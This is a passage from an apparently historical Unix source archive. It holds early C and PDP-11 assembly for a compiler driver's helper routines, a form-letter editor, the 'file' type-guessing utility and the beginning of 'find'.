	char t, *os;

	c = 0;
	os = s;
	while(t = *s++)
		if (t=='/')
			c = 0;
		else
			c++;
	s =- 3;
	if (c<=14 && c>2 && *s++=='.')
		return(*s);
	return(0);
}

setsuf(s, ch)
char s[];
{
	char *os;

	os = s;
	while(*s++);
	s[-2] = ch;
	return(os);
}

callsys(f, v)
char f[], *v[]; {
	int t, status;

	if ((t=fork())==0) {
		execv(f, v);
		printf("Can't find %s\n", f);
		exit(1);
	} else
		if (t == -1) {
			printf("Try again\n");
			return(1);
		}
	while(t!=wait(&status));
	if ((t=(status&0377)) != 0 && t!=14) {
		if (t!=2)		/* interrupt */
			printf("Fatal error in %s\n", f);
		dexit();
	}
	return((status>>8) & 0377);
}

copy(s)
char s[]; {
	char *otsp;

	otsp = tsp;
	while(*tsp++ = *s++);
	return(otsp);
}

nodup(l, s)
char **l, s[]; {
	char *t, *os, c;

	if (getsuf(s) != 'o')
		return(1);
	os = s;
	while(t = *l++) {
		s = os;
		while(c = *s++)
			if (c != *t++)
				break;
		if (*t++ == '\0')
			return(0);
	}
	return(1);
}

cunlink(f)
char *f;
{
	if (f==0)
		return(0);
	return(unlink(f));
}
-- /usr/source/s1/fed1.s mode=0100664 uid=3 gid=3 atime=174922915 mtime=169260571 --
signal = 48.
testing = 0
/
/	command interpreter for form letter editor
/
/
/
command:
	sys	signal; 2; inter
	jsr	pc,initl
	mov	sp,spi
loop:
	mov	spi,sp
	mov	$buffer,r2
	clr	r4
	clr	iflag
1:
	jsr	pc,tfiget
	cmpb	$' ,r0
	beq	1f
	cmpb	$'\n,r0
	bne	2f
	clrb	(r2)
	br	4f
2:
	movb	r0,(r2)+
	br	1b
1:
	clrb	(r2)
	mov	$argc,r3
3:
	mov	$arg,r2
2:
	jsr	pc,tfiget
	cmpb	$' ,r0
	beq	1f
	cmpb	$'\n,r0
	beq	1f
	movb	r0,(r2)+
	br	2b
1:
	clrb	(r2)+
	inc	r4
1:
	movb	-(r2),sv
	cmp	r2,$arg
	blos	1f
	movb	-(r2),-(sp)
	movb	sv,1(sp)
	cmp	r2,$arg
	bhi	1b
	mov	sp,(r3)+
	br	2f
1:
	clrb	-(sp)
	movb	sv,1(sp)
	mov	sp,(r3)
	add	$1,(r3)+
2:
	cmpb	r0,$'\n
	bne	3b
1:
	mov	-(r3),-(sp)
	cmp	r3,$argc
	bhi	1b
4:
	mov	r4,-(sp)
3:
	clr	r0
	mov	$tabl,r4
2:
	mov	(r4)+,r1
	cmp	r4,$tend
	bhi	error
	add	$2,r0
	mov	$buffer,r2
1:
	cmpb	(r1)+,(r2)+
	bne	2b
	tstb	(r1)
	bne	1b
	tstb	(r2)
	bne	2b
	sub	$2,r0
	add	$jtable,r0
	clr	vflag
	clr	qflag
	jmp	*(r0)
/
error:
	mov	$1,r0
	sys	write; err; 2
	br	loop
/
/
tabl: c1; c2; c3; c4; c5; c6; c7; c8; 
tend:	0
c1:	<n\0>
c2:	<p\0>
c3:	<e\0>
c4:	<d\0>
c5:	<m\0>
c6:	<fin\0>
c7:	<q\0>
c8:	<c\0>
err:	<?\n>
endt:	.even
jtable: list; listf; ed; remove; rename;  fin; q; memck;
spi:	.=.+2
sv:	.=.+2
-- /usr/source/s1/fed2.s mode=0110664 uid=3 gid=3 atime=174922915 mtime=169260571 --
/
/
ed:
	mov	(sp)+,r3
	ble	error
econ:
	sys	stat; ftemp; buffer
	bec	2f
	sys	creat; ftemp; 666
	mov	r0,tmpw
	sys	open; ftemp; 0
	mov	r0,tmpr
	br	1f
2:
	cmpb	$'z,ftemp+9.
	bne	2f
	mov	$1,r0
	sys	write; erm; 23.
	jmp	loop
2:
	incb	ftemp+9.
	br	econ
1:
	mov	(sp),r0
	jsr	pc,getspq
	bes	3f
	mov	r0,r4
	mov	r2,r1
	jsr	pc,rewind
	mov	$buffer,r2
1:
	jsr	pc,getchar
	bes	1f
	movb	r0,(r2)+
	br	1b
1:
	movb	$'\n,(r2)+
	jsr	pc,output
	mov	r4,r1
	jsr	pc,rewind
2:
	mov	$buffer,r2
1:
	jsr	pc,getchar
	bes	1f
	movb	r0,(r2)+
	cmp	r2,$bufend
	blo	1b
	mov	tmpw,r0
	sys	write; buffer; 512.
	br	2b
1:
	sub	$buffer,r2
	beq	4f
	mov	r2,0f
	mov	tmpw,r0
	sys	write; buffer; 0:..
4:
	tst	iflag
	beq	1f
	mov	tmpw,r0
	sys	close
	mov	tmpr,r0
	sys	close
	sys	unlink; ftemp
	jmp	loop
1:
	mov	tmpw,r0
	sys	close
	sys	fork
	br	5f
	mov	r1,-(sp)
	sys	wait
	sys	signal; 2; inter
	mov	(sp)+,r1
	mov	a(r1),w(r1)
2:
	mov	tmpr,r0
	sys	read; buffer; 512.
	tst	r0
	beq	2f
	add	$buffer,r0
	mov	r0,bufend
	mov	$buffer,r2
1:
	movb	(r2)+,r0
	jsr	pc,putchar
	cmp	r2,bufend
	blo	1b
	br	2b
2:
	mov	tmpr,r0
	sys	close
	sys	unlink; ftemp
	tst	iflag
	beq	1f
	jmp	loop
1:
	tst	qflag
	bgt	1f
	tst	(sp)+
	dec	r3
	bgt	1f
	jmp	loop
1:	jmp	econ
	jmp	loop
3:
	mov	(sp),r2
	mov	$2,r0
	jsr	pc,allocate
1:
	tstb	(r2)
	beq	1f
	movb	(r2)+,r0
	jsr	pc,putchar
	br	1b
1:
	mov	r1,r0
	mov	asmem,r1
	jsr	pc,putword
	mov	$2,r0
	jsr	pc,allocate
	mov	r1,r0
	mov	asmem,r1
	jsr	pc,putword
	mov	r0,r1
	br	4b
5:
	mov	$2,r0
1:
	sys	close
	inc	r0
	cmp	r0,$10.
	blo	1b
	sys	exec; edd; eda
	sys	exit
eda:	edd; ftemp; 0
edd:	</bin/ed\0>
	.even
ftemp:	</tmp/ftmpa\0>
erm:	<Cannot open temp. file\n>
	.even
tmpw:	.=.+2
tmpr:	.=.+2
/
/	remove a 'file' from memory
/
remove:
	mov	(sp)+,r3
	bgt	5f
	mov	$1,vflag
	mov	asmem,r1
	jsr	pc,rewind
	mov	r(r1),-(sp)
4:
	tst	iflag
	beq	1f
	jmp	loop
1:
	jsr	pc,getword
	bes	4f
	mov	r0,r2
	jsr	pc,ask
	bec	1f
	mov	r(r1),(sp)
	br	4b
1:
	jsr	pc,getword
	br	2f
5:
	mov	(sp),r0
	jsr	pc,getspq
	bec	2f
	tst	qflag
	blt	6f
	mov	(sp),r1
	jsr	pc,nothere
	br	3f
2:
	mov	r0,r1
	jsr	pc,release
	mov	r2,r1
	jsr	pc,release
	jsr	pc,rm
3:
	tst	vflag
	bne	3f
	tst	iflag
	beq	1f
	jmp	loop
1:
	tst	qflag
	bgt	5b
6:
	tst	(sp)+
	dec	r3
	bgt	5b
	jmp	loop
3:
	mov	asmem,r1
	mov	(sp),r(r1)
	br	4b
4:
	tst	(sp)+
	jmp	loop
/
/	rename a 'file'
/
rename:
	mov	(sp)+,r3
	bne	1f
	jmp	error
1:
	sub	$2,r3
	blt	1f
5:
	mov	(sp),r0
	jsr	pc,getsp
	bes	4f
	tst	(sp)+
	sub	$4,r(r1)
	mov	(sp),r0
	mov	r2,-(sp)
	mov	r(r1),-(sp)
	jsr	pc,getsp
	bes	3f
	mov	r2,-(sp)
	mov	r0,r1
	jsr	pc,release
	jsr	pc,rm
	mov	(sp)+,r0
	mov	(sp)+,r(r1)
	jsr	pc,alterword
	mov	(sp)+,r1
	jsr	pc,release
	br	5f
3:
	mov	(sp)+,r(r1)
	mov	(sp)+,r1
	jsr	pc,release
	mov	$2,r0
	jsr	pc,allocate
	mov	(sp)+,r2
2:
	movb	(r2)+,r0
	beq	2f
	jsr	pc,putchar
	br	2b
2:
	mov	r1,r0
	mov	asmem,r1
	jsr	pc,alterword
5:
	tst	iflag
	beq	2f
	jmp	loop
2:
	tst	r3
	beq	2f
	sub	$2,r3
	bge	5b
1:
	tst	(sp)+
	jmp	error
2:
	jmp	loop
4:
	mov	(sp)+,r1
	jsr	pc,nothere
	tst	(sp)+
	br	5b
/
/	list contents of asmem
/
list:
	mov	$buffer,r2
	movb	$'\n,(r2)+
	jsr	pc,output
	mov	(sp)+,r3
	beq	1f
	mov	$1,vflag
5:
	tst	iflag
	beq	2f
	jmp	loop
2:
	mov	(sp),r0
	jsr	pc,getspq
	bes	4f
	mov	r2,r1
	br	3f
1:
	mov	asmem,r1
	jsr	pc,fsfile
	sub	$2,r(r1)
2:
	tst	iflag
	bne	2f
	jsr	pc,backword
	bes	2f
	mov	r0,r1
3:
	jsr	pc,getn
	movb	$'\n,(r2)+
	jsr	pc,output
	tst	vflag
	bne	1f
	mov	asmem,r1
	sub	$2,r(r1)
	br	2b
1:
	tst	qflag
	bgt	5b
4:
	tst	(sp)+
	dec	r3
	bgt	5b
2:
	mov	$buffer,r2
	movb	$'\n,(r2)+
	jsr	pc,output
	jmp	loop
/
/	list a 'file
/
listf:
	mov	(sp)+,r3
	bgt	4f
	jmp	error
4:
	mov	(sp),r0
	jsr	pc,getspq
	bes	3f
	mov	r0,r4
	mov	r2,r1
	jsr	pc,rewind
	mov	$buffer,r2
	movb	$'\n,(r2)+
1:
	jsr	pc,getchar
	bes	1f
	movb	r0,(r2)+
	cmp	r2,$bufend
	blo	1b
	jsr	pc,output
	br	1b
1:
	mov	r4,r1
	jsr	pc,rewind
	movb	$':,(r2)+
	cmp	r2,$bufend
	blo	2f
	jsr	pc,output
2:
	movb	$'\n,(r2)+
1:
	tst	iflag
	beq	2f
	jmp	loop
2:
	cmp	r2,$bufend
	blo	2f
	jsr	pc,output
2:
	jsr	pc,getchar
	bes	1f
	movb	r0,(r2)+
	br	1b
1:
	jsr	pc,output
3:
	tst	qflag
	bgt	4b
	tst	(sp)+
	dec	r3
	bgt	4b
	mov	$buffer,r2
	movb	$'\n,(r2)+
	jsr	pc,output
	jmp	loop
/
fin:
	jsr	pc,flush
	jsr	pc,whead
	4
q:
	jsr	pc,flush
	jsr	pc,whead
	sys	exit
memck:	mov	(sp)+,r3
2:
	ble	2f
	mov	(sp)+,r1
	cmpb	(r1),$'p
	bne	1f
	bis	$1,vflag
	br	3f
1:
	cmpb	(r1),$'f
	bne	3f
	bis	$2,vflag
3:
	dec	r3
	br	2b
2:
	clr	freeh
	mov	$freeb,r2
1:
	clr	(r2)+
	cmp	r2,$freen
	blo	1b
	mov	$headers,r2
2:
	cmp	l(r2),$hsz
	beq	6f
	jsr	pc,ck
	bec	1f
	cmp	r2,asmem
	beq	1f
	mov	asmem,r1
	jsr	pc,rewind
	clr	r3
4:
	inc	r3
	jsr	pc,getword
	bes	5f
	cmp	r0,r2
	bne	4b
6:
	inc	freeh
1:
cont:
	add	$8.,r2
	cmp	r2,$headend-4
	blo	2b
	mov	asmem,r1
	jsr	pc,rewind
4:
	jsr	pc,getword
	bes	4f
	tst	r(r0)
	beq	2f
	mov	r0,r2
	jsr	pc,ck
	bes	4b
2:
	sub	$hblk,r0
	jsr	r5,oct
	mov	$1,r0
	sys	write; re; 24.
	cmp	vflag,$1
	beq	4b
	bit	$1,r3
	beq	2f
	jsr	pc,getword
	mov	r0,r1
	jsr	pc,release
	br	3f
2:
	jsr	pc,backword
	add	$4,r(r1)
	mov	r0,r1
	jsr	pc,release
3:
	jsr	pc,rm
	clr	r3
	br	4b
4:
	mov	freeh,r0
	jsr	r5,decml
	mov	$1,r0
	sys	write; frh; 14.
	mov	$freeb,r2
	mov	$1,r3
6:
	cmp	r2,$freen
	bhis	6f
	mov	(r2)+,r0
	beq	3f
	jsr	r5,decml
	mov	$1,r0
	sys	write; frb; 18.
	mov	r3,r0
	jsr	r5,decml
	mov	$1,r0
	sys	write; lf; 1.
3:
	asl	r3
	br	6b
6:
	mov	$1,r0
	sys	write; lf; 1.
	jmp	loop
5:
	mov	r2,r0
	sub	$hblk,r0
	jsr	r5,oct
	mov	$1,r0
	sys	write; un; 26.
	tst	vflag
	beq	1b
	mov	r2,r1
	cmp	vflag,$2
	beq	3f
	jsr	pc,rewind
	mov	$buffer,r2
2:
	jsr	pc,getchar
	bes	2f
	movb	r0,(r2)+
	cmp	r2,$buffer+80.
	blo	2b
	jsr	pc,output
	br	2b
2:
	movb	$'\n,(r2)+
	jsr	pc,output
	mov	r1,r2
	cmp	vflag,$1
	bne	3f
	jmp	cont
3:
	jsr	pc,release
	jmp	cont
/
interrupt: 4
/
un:	< header not accounted for\n>
re:	< part of asmem released\n>
lf:	<\n>
frh:	< free headers\n >
frb:	< free blocks size >
endc:	.even
-- /usr/source/s1/fed3.s mode=0110664 uid=3 gid=3 atime=174922916 mtime=169260571 --
rti = 2
.globl rm
.globl ck
.globl loop
.globl oct
.globl argc
.globl arg
.globl tfiget
.globl asmem
.globl qflag
.globl vflag
.globl getspq
.globl q
.globl ask
.globl getword
.globl r
.globl w
.globl	output
.globl buffer
.globl bufend
.globl fv
.globl	getsp
.globl release
.globl nothere
.globl getn
.globl getchar
.globl rewind
.globl iflag
.globl inter
/	output buffer
/	r2 = last char in buffer + 1
/	r2 returned at beginning of buffer
/
output:
	sub	$buffer,r2
	blos	1f
	mov	r2,0f
	mov	$1,r0
	sys	write; buffer; 0:..
	mov	$buffer,r2
1:
	rts	pc
/
/
/	routine to find the string pointed to by r0
/	in either memory or curly
/	r1 = where to look
/
/	returns error set if string not there
/	returns r1 = header of string if there
getsp:
	mov	r0,-(sp)
	mov	asmem,r1
	jsr	pc,rewind	/memory
3:
	jsr	pc,getword
	bes	1f
	mov	r0,r1
	jsr	pc,rewind
	mov	(sp),r2
2:
	jsr	pc,getchar
	bes	2f
	tstb	(r2)
	beq	4f
	cmpb	r0,(r2)+
	beq	2b
4:
	mov	asmem,r1
	add	$2,r(r1)
	br	3b
2:
	tstb	(r2)
	bne	4b
	mov	r1,r2
	mov	asmem,r1
	jsr	pc,getword
	tst	(sp)+
	rts	pc
1:
	mov	(sp)+,r0
	sec
	rts	pc
/
/	finds header of string with name same as that pointed to by r0
/	taking into account ? and * 
getspq:
	mov	r0,-(sp)
	mov	asmem,r1
	tst	qflag
	bgt	1f
	jsr	pc,rewind
1:
	jsr	pc,getword
	bes	1f
	mov	r0,r1
	jsr	pc,rewind
	mov	(sp),r2
2:
	cmpb	(r2),$'*
	bne	3f
	clr	strflg
	mov	$2,qflag
	inc	r2
	tstb	(r2)
	beq	6f
	mov	r2,ch
3:
	jsr	pc,getchar
	bes	2f
	tstb	(r2)
	bne	3f
	cmp	$2,qflag
	bne	4f
	mov	ch,r2
3:
	cmpb	(r2),$'?
	bne	3f
	inc	r2
	tst	qflag
	bne	2b
	mov	$1,qflag
	br	2b
3:
	cmpb	r0,(r2)+
	bne	5f
	inc	strflg
	br	2b
5:
	cmp	$2,qflag
	bne	4f
	tst	strflg
	bne	4f
	dec	r2
	br	2b
4:
	mov	asmem,r1
	add	$2,r(r1)
	br	1b
2:
	tstb	(r2)
	bne	4b
6:
	mov	r1,r2
	mov	asmem,r1
	jsr	pc,getword
	tst	(sp)+
	rts	pc
1:
	mov	$-1.,qflag
	mov	(sp)+,r0
	sec
	rts	pc
/
/	tfiget
/	jsr	r5,tfiget
/
tfiget:
	clr	r0
	sys	read; ch; 1
	bes	1f
	tst	iflag
	beq 9f; jmp loop; 9:
	tst	r0
	beq	1f
	movb	ch,r0
	rts	pc
1:	jmp	q
/
/	routine to print file name and error message
/	r2 = next free byte in buffer
/
nothere:
	mov	$buffer,r2
1:
	tstb	(r1)
	beq	1f
	movb	(r1)+,(r2)+
	br	1b
1:
	sub	$buffer,r2
	mov	r2,0f
	mov	$1,r0
	sys	write; buffer; 0:..
	mov	$1,r0
	sys	write; err4; 16.
	rts	pc
/
/
/	routine to put characters from string in buffer
/	r1 = header of string
/	on return r2 = next free byte in buffer
/
getn:
	mov	$buffer,r2
	jsr	pc,rewind
1:
	jsr	pc,getchar
	bes	1f
	movb	r0,(r2)+
	cmp	r2,$bufend
	bhis	1f
	br	1b
1:	rts	pc
/
ask:
	mov	r2,-(sp)
	mov	r0,r1
	jsr	pc,getn
	movb	$' ,(r2)+
	jsr	pc,output
	jsr	pc,tfiget
	cmpb	$'\n,r0
	bne	1f
2:
	mov	asmem,r1
	add	$2,r(r1)
	mov	(sp)+,r2
	sec
	rts	pc
1:
	cmpb	r0,$'y
	beq	4f
	cmpb	r0,$'q
	beq	3f
1:
	tst	iflag
	bne	2b
	jsr	pc,tfiget
	cmpb	$'\n,r0
	bne	1b
	br	2b
4:
	tst	iflag
	bne	2b
	jsr	pc,tfiget
	cmpb	$'\n,r0
	bne	1b
	mov	asmem,r1
	mov	(sp)+,r2
	clc
	rts	pc
3:
	tst	iflag
	bne	2b
	jsr	pc,tfiget
	cmpb	$'\n,r0
	bne	1b
	mov	(sp)+,r2
	jmp	loop
inter:
	inc	iflag
	rti
/	to remove an entry from asmem - r points to name ptr
/
rm:
	mov	r3,-(sp)
	mov	asmem,r1
	mov	r(r1),r3
	sub	$4,r(r1)
	mov	r(r1),r2
	mov	r2,-(sp)
1:
	mov	r3,r(r1)
	jsr	pc,getword
	bes	1f
	mov	r(r1),r3
	mov	r2,r(r1)
	jsr	pc,alterword
	mov	r(r1),r2
	br	1b
1:
	mov	r2,w(r1)
	mov	(sp)+,r(r1)
	mov	(sp)+,r3
	rts	pc
/
/	check that header pointed to by r2 released
/
ck:
	mov	r2,-(sp)
	mov	l(r2),r0
	sub	a(r2),r0
	sub	$hblk,r2
	jsr	pc,log2
	asl	r0
	mov	r0,ch
	mov	frlist(r0),r0
1:
	beq	1f
	cmp	r2,r0
	beq	2f
	add	$hblk,r0
	mov	(r0),r0
	br	1b
2:
	mov	ch,r0
	inc	freeb(r0)
	mov	(sp)+,r2
	rts	pc
1:
	mov	(sp)+,r2
	sec
	rts	pc
oct:
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	$8.,r0
	mov	r1,-(sp)
	add	$'0,(sp)
	tst	r0
	beq	1f
	jsr	r5,oct
1:
	movb	(sp)+,ch
	mov	$1,r0
	sys	write; ch; 1
	mov	(sp)+,r1
	rts	r5

decml:
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	add	$'0,(sp)
	tst	r0
	beq	1f
	jsr	r5,decml
1:
	movb	(sp)+,ch
	mov	$1,r0
	sys	write; ch; 1
	mov	(sp)+,r1
	rts	r5
/
/
iflag:	0
qflag:	0
vflag:	0
	.data
err4:	< not in memory.\n>
err1:	<Cannot open file >
end1:	.even
	.bss
freeh:	.=.+2
freeb:	.=.+32.
freen:
ch:	.=.+2
strflg:	.=.+2
buffer:	.=.+512.
bufend:	.=.+2
argc = buffer + 20.
arg = buffer + 256.
fv:	.=.+2
	.text
-- /usr/source/s1/file.c mode=0110664 uid=3 gid=3 atime=174922926 mtime=169260571 --
int in;
int i 0;
char buf[512];
int *wd {
	&buf[0]};
char *fort[]{
	"function","subroutine","common","dimension","block","integer",
	"real","data","double",0};
char *asc[]{
	"sys","mov","tst","clr","jmp",0};
char *c[]{
	"int","char","float","double","struct","extern",0};
char *as[]{
	"globl","byte","even","text","data","bss","comm",0};
int ibuf[260];
main(argc, argv)
char **argv;
{

	while(argc > 1) {
		printf("%s:	", argv[1]);
		type(argv[1]);
		argc--;
		argv++;
	}
}

type(file)
char *file;
{
	int j,nl;
	char ch;
	int mbuf[20];

	if(stat(file, mbuf) < 0) {
		printf("cannot stat\n");
		return;
	}
	switch(mbuf[2]&060000) {

	case 020000:
		printf("character");
		goto spcl;

	case 040000:
		printf("directory\n");
		return;

	case 060000:
		printf("block");

spcl:
		printf(" special (%d/%d)\n",
		(mbuf[6]>>8)&0377,
		mbuf[6]&0377);
		return;
	}

	ibuf[0] = open(file, 0);
	if(ibuf[0] < 0) {
		printf("cannot open\n");
		return;
	}
	in = read(ibuf[0], buf, 512);
	switch(*wd) {

	case 0407:
		printf("executable\n");
		goto out;

	case 0410:
		printf("pure executable\n");
		goto out;

	case 0411:
		printf("separate executable\n");
		goto out;

	case 0177555:
		printf("archive\n");
		goto out;
	}

	i = 0;
	if(ccom() == 0)goto notc;
	while(buf[i] == '#'){
		j = i;
		while(buf[i++] != '\n'){
			if(i - j > 255){
				printf("data\n"); 
				goto out;
			}
			if(i >= in)goto notc;
		}
		if(ccom() == 0)goto notc;
	}
check:
	if(lookup(c) == 1){
		while((ch = buf[i++]) != ';' && ch != '{')if(i >= in)goto notc;
		printf("c program");
		goto outa;
	}
	nl = 0;
	while(buf[i] != '('){
		if(buf[i] <= 0){
			printf("data\n"); 
			goto out; 
		}
		if(buf[i] == ';'){
			i++; 
			goto check; 
		}
		if(buf[i++] == '\n')
			if(nl++ > 6)goto notc;
		if(i >= in)goto notc;
	}
	while(buf[i] != ')'){
		if(buf[i++] == '\n')
			if(nl++ > 6)goto notc;
		if(i >= in)goto notc;
	}
	while(buf[i] != '{'){
		if(buf[i++] == '\n')
			if(nl++ > 6)goto notc;
		if(i >= in)goto notc;
	}
	printf("c program");
	goto outa;
notc:
	i = 0;
	while(buf[i] == 'c' || buf[i] == '#'){
		while(buf[i++] != '\n')if(i >= in)goto notfort;
	}
	if(lookup(fort) == 1){
		printf("fortran");
		goto outa;
	}
notfort:
	i=0;
	if(ascom() == 0)goto notas;
	j = i-1;
	if(buf[i] == '.'){
		i++;
		if(lookup(as) == 1){
			printf("assembler program"); 
			goto outa;
		}
		else if(buf[j] == '\n'){
			printf("roff, nroff, or eqn input");
			goto outa;
		}
	}
	while(lookup(asc) == 0){
		if(ascom() == 0)goto notas;
		while(buf[i] != '\n' && buf[i++] != ':')
			if(i >= in)goto notas;
		while(buf[i] == '\n' || buf[i] == ' ' || buf[i] == '\t')if(i++ >= in)goto notas;
		j = i-1;
		if(buf[i] == '.'){
			i++;
			if(lookup(as) == 1){
				printf("assembler program"); 
				goto outa; 
			}
			else if(buf[j] == '\n'){
				printf("roff, nroff, or eqn input");
				goto outa;
			}
		}
	}
	printf("assembler program");
	goto outa;
notas:
	for(i=0; i < in; i++)if(buf[i] <= 0){
		printf("data\n"); 
		goto out; 
	}
	if((mbuf[2] & 00111) != 0)
		printf("commands");
	else printf("probably text");
outa:
	while(i < in)
		if(buf[i++] <= 0){
			printf(" with garbage\n");
			goto out;
		}
	while((in = read(ibuf[0],buf,512)) > 0)
		for(i = 0; i < in; i++)
			if(buf[i] <= 0){
				printf(" with garbage\n");
				goto out;
			}
	printf("\n");
out:
	close(ibuf[0]);
}
lookup(tab)
char *tab[];
{
	char r;
	int k,j,l;
	while(buf[i] == ' ' || buf[i] == '\t' || buf[i] == '\n')i++;
	for(j=0; tab[j] != 0; j++){
		l=0;
		for(k=i; ((r=tab[j][l++]) == buf[k] && r != '\0');k++);
		if(r == '\0')
			if(buf[k] == ' ' || buf[k] == '\n' || buf[k] == '\t'
			    || buf[k] == '{' || buf[k] == '/'){
				i=k;
				return(1);
			}
	}
	return(0);
}
ccom(){
	char cc;
	while((cc = buf[i]) == ' ' || cc == '\t' || cc == '\n')if(i++ >= in)return(0);
	if(buf[i] == '/' && buf[i+1] == '*'){
		i =+ 2;
		while(buf[i] != '*' || buf[i+1] != '/'){
			if(buf[i] == '\\')i =+ 2;
			else i++;
			if(i >= in)return(0);
		}
		if((i =+ 2) >= in)return(0);
	}
	if(buf[i] == '\n')if(ccom() == 0)return(0);
	return(1);
}
ascom(){
	while(buf[i] == '/'){
		i++;
		while(buf[i++] != '\n')if(i >= in)return(0);
		while(buf[i] == '\n')if(i++ >= in)return(0);
	}
	return(1);
}
-- /usr/source/s1/find.c mode=0110664 uid=3 gid=3 atime=174922946 mtime=169260571 --
/* find -- find files in a pathname.
	Use of find is documented in /usr/man/man1/find.1 .

	In addition, find has a secret first arg "+" which
	causes each file name to be printed along with a period
	if the predicates succeed.
 */
int randlast;
char *pathname;
int verbose;
struct anode {
	int (*F)();
	struct anode *L, *R;
} node[100];
int nn;  /* number of nodes */
char *fname, *path;
int now[2];
int ap, ac;
char **av;

struct ibuf {
	int	idev;
	int	inum;
	int	iflags;
	char	inl;
	char	iuid;
	char	igid;
	char	isize0;
	char	*isize;
	int	iaddr[8];
	int	iatime[2];
	int	imtime[2];
} statb;

main(argc,argv) char *argv[]; {

struct anode *exlist;
int find();

	time(&now);
	ac = argc; av = argv; ap = 2;
	pathname = argv[1];
	if(compstr(argv[1],"+")==0) {
		verbose++;
		ap++;
		pathname = argv[2];
	} else verbose = 0; 
	argv[argc] = 0;
	if(argc<3) {
		printf("Insufficient args\n");
		exit(9);
	}
	if(!(exlist = exp())) { /* parse and compile the arguments */
		printf("Odd usage\n");
		exit(9);
	}
	if(ap<argc) {
		printf("Missing conjunction\n");
		exit(9);
	}
	descend(pathname,'f',find,exlist); /* to find files that match  */
}

/* compile time functions:  priority is  exp()<e1()<e2()<e3()  */

struct anode *exp() { /* parse -o ... */
	int or();
	int p1;
	char *na;
	p1 = e1() /* get left operand */ ;
	if(compstr(na=nxtarg(),"-o")==0) {
		randlast--;
		return(mk(&or,p1,exp()));
	}
	else if(*na!=0) --ap;
	return(p1);
}
struct anode *e1() { /* parse -a */
	int and();
	int p1;
	char *na;
	p1 = e2();
	if(compstr(na=nxtarg(),"-a")==0) {
		randlast--;
		return(mk(&and,p1,e1()));
	}
	else if(*na!=0) --ap;
	return(p1);
}
struct anode *e2() { /* parse not (!) */
	int not();
	char *na;
	if(randlast) {
		printf("operand follows operand.\n");
		exit(9);
	}
	randlast++;
	if(compstr(na=nxtarg(),"!")==0)
		return(mk(&not,e3(),0));
	else if(*na!=0) --ap;
	return(e3());
}
struct anode *e3() { /* parse parens and predicates */
	int exeq(), ok(), glob(),  mtime(), atime(), user(),
		group(), size(), perm(), links(), print(),
		type();
	int p1, i;
	char *a, *b, s;
	a = nxtarg();
	if(compstr(a,"(")==0) {
		randlast--;
		p1 = exp();
		a = nxtarg();
		if(compstr(a,")")!=0) goto err;
		return(p1);
	}
	else if(compstr(a,"-print")==0) {
		return(mk(&print,0,0));
	}
	b = nxtarg();
	s = *b;
	if(s=='+') b++;
	if(compstr(a,"-name")==0)
		return(mk(&glob,b,0));
	else if(compstr(a,"-mtime")==0)
		return(mk(&mtime,atoi(b),s));
	else if(compstr(a,"-atime")==0)
		return(mk(&atime,atoi(b),s));
	else if(compstr(a,"-user")==0) {
		if((i=getunum(b)) == -1) {
			printf("Cannot find user \"%s\"\n",b);
			exit(9);
		}
		return(mk(&user,i,s));
	}
	else if(compstr(a,"-group")==0)
		return(mk(&group,atoi(b),s));
	else if(compstr(a,"-size")==0)
		return(mk(&size,atoi(b),s));
	else if(compstr(a,"-links")==0)
		return(mk(&links,atoi(b),s));
	else if(compstr(a,"-perm")==0) {
		for(i=0; *b ; ++b) {
			if(*b=='-') continue;
			i =<< 3;
			i = i + (*b - '0');
		}
		return(mk(&perm,i,s));
	}
	else if(compstr(a,"-type")==0) {
		i = s=='d' ? 040000 :
		    s=='b' ? 060000 :
		    s=='c' ? 020000 :
		    000000;
		return(mk(&type,i,0));
	}
	else if (compstr(a,"-exec")==0) {
		i = ap - 1;
		while(compstr(nxtarg(),";")!=0);
		return(mk(&exeq,i,0));
	}
	else if (compstr(a,"-ok")==0) {
		i = ap - 1;
		while(compstr(nxtarg(),";")!=0);
		return(mk(&ok,i,0));
	}
	err: printf("Bad option: \"%s\" \"%s\"\n",a,b);
	exit(9);
}
struct anode *mk(f,l,r) struct anode *l,*r; { /*make an expression node*/
	node[nn].F = f;
	node[nn].L = l;
	node[nn].R = r;
	return(&(node[nn++]));
}

nxtarg() { /* get next arg from command line */
	if(ap>=ac) return("");
	return(av[ap++]);
}

find(exlist,fullname) /* execute predicat list with current file */
struct anode *exlist;
char *fullname;
{
register int i;
	path = fullname;
	if(verbose) printf("%s",path);
	for(i=0;fullname[i];++i)
		if(fullname[i]=='/') fname = &fullname[i+1];
	i = (*exlist->F)(exlist);
	if(verbose)
		if(i) printf(".\n");
		else printf("\n");
}

/* execution time functions */
and(p) struct anode *p; {
	return(((*p->L->F)(p->L)) && ((*p->R->F)(p->R))?1:0);
}
or(p) struct anode *p; {
	 return(((*p->L->F)(p->L)) || ((*p->R->F)(p->R))?1:0);
}
not(p) struct anode *p; {
	return( !((*p->L->F)(p->L)));
}
glob(p) struct { int f; char *pat; } *p;  {
	return(gmatch(fname,p->pat));
}
print() {
	printf("%s\n",path);
	return(1);
}
mtime(p) struct { int f, t, s; } *p;  {
	return(scomp((now[0]-statb.imtime[0])*3/4,p->t,p->s));
}
atime(p) struct { int f, t, s; } *p;  {
	return(scomp((now[0]-statb.iatime[0])*3/4,p->t,p->s));
}
user(p) struct { int f, u, s; } *p;  {
	return(scomp(statb.iuid,p->u,p->s));
}
group(p) struct { int f, u; } *p;  {
	return(p->u == statb.igid);
}
links(p) struct { int f, link, s; } *p;  {
	return(scomp(statb.inl,p->link,p->s));
}
size(p) struct { int f, sz, s; } *p;  {
	register int i;
	i = statb.isize0 << 7;
	i = i | ((statb.isize>>9) & 0177);
	return(scomp(i,p->sz,p->s));
}
perm(p) struct { int f, per, s; } *p;  {
int i;
	i = (p->s=='-') ? p->per : 03777; /* '-' means only arg bits */
	return((statb.iflags & i & 017777) == p->per);
}
type(p) struct { int f, per, s; } *p; {
	return((statb.iflags&060000)==p->per);
}
exeq(p) struct { int f, com; } *p; {
	return(doex(p->com));
}
ok(p) struct { int f, com; } *p; {
	char c;  int yes;
	yes = 0;
	printf("%s ... %s ...? ",av[p->com],path);
	if((c=getchar())=='y') yes = 1;
	while(c!='\n') c = getchar();
	if(yes) return(doex(p->com));
	return(0);
}

/* support functions */
scomp(a,b,s) char s; { /* funny signed compare */
	if(s == '+')
		return(a > b);
	if(s == '-')
		return(a < (b * -1));
	return(a == b);
}
doex(com) {
	int ccode;
	int np, i, c;
